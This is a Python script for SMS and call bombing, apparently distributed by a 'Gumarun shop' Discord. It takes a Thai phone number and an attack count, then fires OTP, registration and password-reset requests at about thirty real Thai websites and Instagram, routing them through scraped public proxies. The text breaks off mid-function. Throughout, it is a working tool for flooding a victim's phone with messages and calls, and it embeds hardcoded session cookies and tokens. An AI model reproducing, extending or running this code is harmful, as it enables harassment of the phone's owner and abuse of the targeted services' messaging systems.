import requests as ru
import threading
import requests
import time
import random
import os
import datetime
import sys
import asyncio
import random
from re import search
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from requests import Session,post,get
os.system("clear")

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()


async def home():
	print('''

   ▄████  █    ██   ███▄ ▄███▓ ▄▄▄      ██▀███   █    ██  ███▄    █ 
▒ ██▒ ▀█▒ ██  ▓██▒ ▓██▒▀█▀ ██▒▒████▄   ▓██ ▒ ██▒ ██  ▓██▒ ██ ▀█   █ 
░▒██░▄▄▄░▓██  ▒██░ ▓██    ▓██░▒██  ▀█▄ ▓██ ░▄█ ▒▓██  ▒██░▓██  ▀█ ██▒
░░▓█  ██▓▓▓█  ░██░ ▒██    ▒██ ░██▄▄▄▄██▒██▀▀█▄  ▓▓█  ░██░▓██▒  ▐▌██▒
░▒▓███▀▒░▒▒█████▓ ▒▒██▒   ░██▒ ▓█   ▓██░██▓ ▒██▒▒▒█████▓ ▒██░   ▓██░
 ░▒   ▒   ▒▓▒ ▒ ▒ ░░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▓ ░▒▓░ ▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ 
  ░   ░   ░▒░ ░ ░ ░░  ░      ░  ░   ▒▒   ░▒ ░ ▒░ ░▒░ ░ ░ ░ ░░   ░ ▒░
░ ░   ░ ░  ░░ ░ ░  ░      ░     ░   ▒     ░   ░   ░░ ░ ░    ░   ░ ░ 
      ░     ░     ░       ░         ░     ░        ░              ░ 
      

                                    [Gumarun shop]
                          [https://discord.com/invite/hSbDP5Rmc8] 
	''')
	phone = input(" \x1b[96m[PHONE-NUMBER]  : \x1b[92m")
	
	if int(phone) <= 99999999 or int(phone) >= 999999999:
		print()
		print('\x1b[92m[ NONAME ]\x1b[00m : \x1b[91mEnter a Thailand phone number [ ! ] \x1b[00m')
		time.sleep(1)
		os.system('clear')
		os.system("python smsflood.py")
	else:
		jam = int(input("\x1b[96m [AMOUNT-ATTACK] : \x1b[92m"))
		print()
		print()
		
		ru.post("https://www.tgfone.com/signin/add_register",headers={"content-type": "application/x-www-form-urlencoded","user-agent": generate_user_agent(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "PHPSESSID=6d00c9f6d3b9b31a559fbc13edb560d4e571fb71;_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_gat_gtag_UA_163796127_1=1;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657955943.0;_ga=GA1.2.160165897.1657955937"},data=f"mobile_form={phone}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2")
		
		def api1():
			send = Session()
			send.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
			sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone,proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{sms}")
		def api2():
			r = requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api3():
			r = requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api4():
			r = requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[5:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[5:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def ig_token():
			d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
			d=search("csrftoken=(.*);",d).group(1).split(";")
			return d[0],d[10].replace(" Secure, ig_did=","")
		def api5():
			token,_=ig_token()
			d=post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
			print(f"\x1b[92m{d}")
		def api6():
			r = requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api7():
			r = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api8():
			r = requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api9():
			r = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api10():
			r = requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api11():
			r = requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api12():
			r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api13():
			r = requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",headers={"authorization": "Basic d2ViQXBwOndlYkFwcA==","content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},data=f"phone={phone[1:]}&type=1",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api14():
			r = requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api15():
			r = requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","cookie": "_gcl_au=1.1.628507904.1657519113;_cbclose=1;_cbclose26068=1;_uid26068=51BC4E60.1;_ctout26068=1;verify=test;_ga=GA1.2.682897436.1657519114;_gid=GA1.2.1721036016.1657519114;_gat_UA-86733131-1=1;_fbp=fb.1.1657519114976.1588263006;afUserId=64e5ba75-c9e2-4e45-aa62-7f5318ec6d9c-p;AF_SYNC=1657519116965;_ga_R05PJC3ZG8=GS1.1.1657519113.1.1.1657519130.43;OptanonAlertBoxClosed=2022-07-11T05:58:54.186Z;OptanonConsent=isIABGlobal=false&datestamp=Mon+Jul+11+2022+12%3A58%3A54+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1"},json={"msisdn":phone,"function":"enroll"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api16():
			session = Session()
			ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
			r = session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api17():
			r = requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp-login/",headers={"Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=080ugg4928ulkhj6kaggiqkvd1; _ga=GA1.3.1856390916.1657557339; _gid=GA1.3.1103002458.1657557339; _gat_gtag_UA_141105037_1=1; G_ENABLED_IDPS=google"},data=f"phone_number={phone}&lag=",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api18():
			r = requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',headers={"accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": generate_user_agent(),"cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api19():
			r = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api20():
			r = requests.post("https://www.msport1688.com/auth/otp_sender",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "msp_ss_client=4a4nipncnp9l5ced7k5v7rrs9hdnscda;_ga=GA1.1.72563414.1657611524;_ga_1YLLB0C2FF=GS1.1.1657611524.1.1.1657611527.0"},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api21():
			r = requests.post("https://ep789bet.net/auth/send_otp",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","user-agent": "ep789bet=g9b6cbooof7sq9tmmdtside6s1topdus;__cf_bm=N34Ldd3PZGzyar210NA3MW6tlk6DVyL7TRWX9siAsXk-1657612222-0-AchySBWuKW05LLldbYqjOGsQ9fG8ijO20enZMUqVHANUif9L3qqazpIcC5nC+tUMIfCoSH575g2k16EyMHk43KcE5tZmJTd+lHogz8Rpd3lKbU3eUD1RsrUmgeJwbddVBQ=="},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api22(): # CALL FREE
			r = requests.post("https://www.theconcert.com/rest/request-otp",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": generate_user_agent(),"x-requested-with": "XMLHttpRequest","x-csrf-token": "d6VfYNo3-RJK5IK0axoCE7KLIAPbW9K0IbL8","x-xsrf-token": "b2b9a4f732d05668c61e64f836417f67/iS0TaMFdXciRQYns4jNXpeVYy3DlvGY6ML+q8oquXvseUvcnIelmUwwR9/wJHKHjGKfN0+WS9orN1zdtt4J3I72qJ3x4Va07eBC0isPMu4ktiZw5DvLcobqJ9l39rFP"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api23():
			r = requests.post("https://www.jdbaa.com/api/otp-not-captcha",headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_ga=GA1.2.139524076.1653888756;_hjSessionUser_1879787=eyJpZCI6IjczNjVhMTYxLTFkNzktNWVjYS04N2M4LTc3ZTk3ODUyY2U3ZiIsImNyZWF0ZWQiOjE2NTM4ODg3NTc4ODksImV4aXN0aW5nIjp0cnVlfQ==;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95;connect.sid=s%3AiV4V1-65FA5rpJyEObOITUh2fyDcYhen.aclXEUqD4Qe5nlUYVG0mb1zIAC4OuxP4FWCX6%2B8E9WU;io=c7ilAXG_QnIDDz0xAKH5;countdown_lotto_th=345759;_gid=GA1.2.626569110.1657612643;_gat_gtag_UA_139533742_1=1;_hjIncludedInSessionSample=0;_hjSession_1879787=eyJpZCI6ImVjMzQ5NWNiLTIwOGQtNGViYS1hNmY3LTY2ZDVhM2JhMGNmZCIsImNyZWF0ZWQiOjE2NTc2MTI2NDUyMzEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;modal_htd=true;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95"},json={"phone_number":phone,"user_id":f"ak{phone}"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api24():
			SEND  = Session()
			API_WEB = SEND.get('https://th.zmyhome.com/',headers={"user-agent": generate_user_agent()}).text
			SEND_TOKEN = bs(API_WEB,'html.parser')
			TOKEN = SEND_TOKEN.find("input",attrs={"name":"_csrf"})
			SMS = SEND.post('https://th.zmyhome.com/api/ajax/sms-otp',headers={"x-csrf-token": TOKEN['value'],"content-type": "application/x-www-form-urlencoded; charset=UTF-8"},data='tel='+phone+'&userId=',proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api25():
			SMS = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api26():
			SMS = requests.post("https://www.tgfone.com/signin/verifylforgot",headers={"user-agent": generate_user_agent(),"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"},data=f"forgot_name={phone}",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api27():
			SEND  = ru.Session()
			API_WEB = SEND.get('https://app.khonde.com/register',headers={"User-Agent": generate_user_agent()}).text
			SEND_TOKEN = bs(API_WEB,'html.parser')
			TOKEN = SEND_TOKEN.find("meta",attrs={"name":"csrf-token"})
			SMS = SEND.get(f'https://app.khonde.com/requestOTP/{phone}',headers={"X-XSRF-TOKEN": TOKEN['content'],"User-Agent": generate_user_agent(),"Cookie": "_gid=GA1.2.1429375693.1657960248; _gac_UA-74972330-26=1.1657960248.CjwKCAjww8mWBhABEiwAl6-2RVYe9XsjIIksM_BccLyzFFDX8T_YVTKKPOe2Q0BPyoTwjuzYwh6EyBoCN7wQAvD_BwE; _gat_gtag_UA_74972330_26=1; _fbp=fb.1.1657960248320.1708448457; _tt_enable_cookie=1; _ttp=da5ea560-0a16-4bc0-90d1-3ddd1fc73db4; XSRF-TOKEN=eyJpdiI6IisyMWw5ZnhaS2JXV3FmR3dyV0JGdVE9PSIsInZhbHVlIjoiQnNLQjh6dExTdmh5ZnJZeHNjNkkzd3dMMHpXV1dZV2hROXYyV0NMSnZpOWdQeFdqRU9RQ3Y4M2Y1aXk5Y1QvcFM1V2N0MG9oRUkxQUU3TlFESDlVU21Qa2JMMmxqRHBISFRsOXZGaFVMVGY0ZW1idysrWUVlNTFQWDYvQ1NSWFgiLCJtYWMiOiI1ODRiNTRmOGJkMzRjMzE1YmUxMmQ2Y2NkZWRhOGQ5ZDkwM2MxYWNjMmVmOTk2MzE4MmYzYmQ3ZWFiYWQ1ZjBlIn0%3D; khonde_session=eyJpdiI6IlMyNmpkRWl4NTh1emFLRWNiL0k2ZlE9PSIsInZhbHVlIjoiSEUzNGNnMVFwNGxJNTZVNmVzMWtrQk82NDZ0eGM1ckxrK3VVS1BWZ1NOMDlmbWl5RXdpa2dDMzQrdzIvMkRZeFpwa2dGamdGcFYwcVZWVjhFSjg2elZ1OUFxTWhuV3hIZlV2cFVIVW9VMnBCUEIxVUV6MVp1Y3JPb3JBOXFZeCsiLCJtYWMiOiJiYzM2ZDVhOWFiOTY3NTAyN2RhYTI1NWYwYjZhY2RmYTgxNWRmOGJkOWJhYjcyMGVhYzU0MjE4NGYxYjdlMTU4In0%3D; _ga_X6J1S6LV1V=GS1.1.1657960251.1.0.1657960251.60; _ga=GA1.1.1429094721.1657960248"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api28():
			SMS = requests.post("https://gamingnation.dtac.co.th/api/otp/request",headers={"User-Agent": generate_user_agent(),"Cookie": "auth.strategy=local; i18n_redirected=th; _gcl_au=1.1.265124296.1661273714; _ga=GA1.3.1857579863.1661273717; _gid=GA1.3.1514915490.1661273717; _fbp=fb.2.1661273718125.787639535; _tt_enable_cookie=1; _ttp=7e4a2162-1ab4-41a0-8b77-e1188cda6a3a; _hjSessionUser_2510409=eyJpZCI6ImVkM2I0OWU2LTBjODQtNWU1ZC04OWIzLTZlMjk5NGFhMWE3NCIsImNyZWF0ZWQiOjE2NjEyNzM3MTc5MzcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjA4YjEyYTNlLTExNjgtNDNlMS05NTVmLWMyMWY2OTU5MGFiYyIsImNyZWF0ZWQiOjE2NjEyNzM3MTgzMTksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _gat_UA-16732483-1=1"},json={"template":"register","phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS}")
		def api29():
			SMS = requests.post("https://api-sso.ch3plus.com/user/request-otp",headers={'user-agent': generate_user_agent()},json={"tel":phone,"type":"login"})
			print(f"\x1b[92m{SMS}")
		def api30():
			SMS = r = requests.post("https://api.cmtrade.com/api/v2/account/sms/code",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA_204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gat_gtag_UA_204031796_2=1; _ga_39RBNN0V78=GS1.1.1664304861.1.0.1664304862.0.0.00","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept": "application/json, text/javascript, */*; q=0.01"},data=f"phone={phone}&countryCode=66&countryId=Thailand&type=mobile",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{SMS.text}")
		def api31():
			SEND  = Session()
			API_WEB = SEND.get('https://www.bigthailand.com/login',headers={"user-agent": generate_user_agent()}).text
			SEND_TOKEN = bs(API_WEB,'html.parser')
			TOKEN = SEND_TOKEN.find("input",attrs={"name":"auth._token.local"})
